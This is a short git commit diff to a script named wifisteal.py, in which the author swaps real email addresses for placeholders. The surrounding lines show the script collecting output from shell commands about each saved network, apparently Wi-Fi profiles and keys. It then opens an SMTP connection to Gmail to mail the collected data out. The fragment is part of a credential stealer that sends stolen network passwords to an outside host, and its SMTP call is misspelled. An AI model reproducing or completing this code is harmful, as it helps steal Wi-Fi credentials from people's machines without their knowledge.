29b1de615596d705fe7f114556fdd23a3514de84
crashoverburn <maiquelrinco@hotmail.com>
2020-09-09 22:44:46 +0100

    Update wifisteal.py

--- wifisteal.py
+++ wifisteal.py
@@ -13,8 +13,8 @@ def main():
                     one_network_result = subprocess.check_output(command2, shell=True)
                     final_output += one_network_result
 
-                my_email = "maiquelgoelzer@gmail.com"
-                email = "maiquelgoelzer@gmail.com"
+                my_email = "xxxx@gmail.com"
+                email = "xxxxxx@gmail.com"
                 password = ""
 
                 server = smtpli.smtp("smtp.gmail.com", 587)
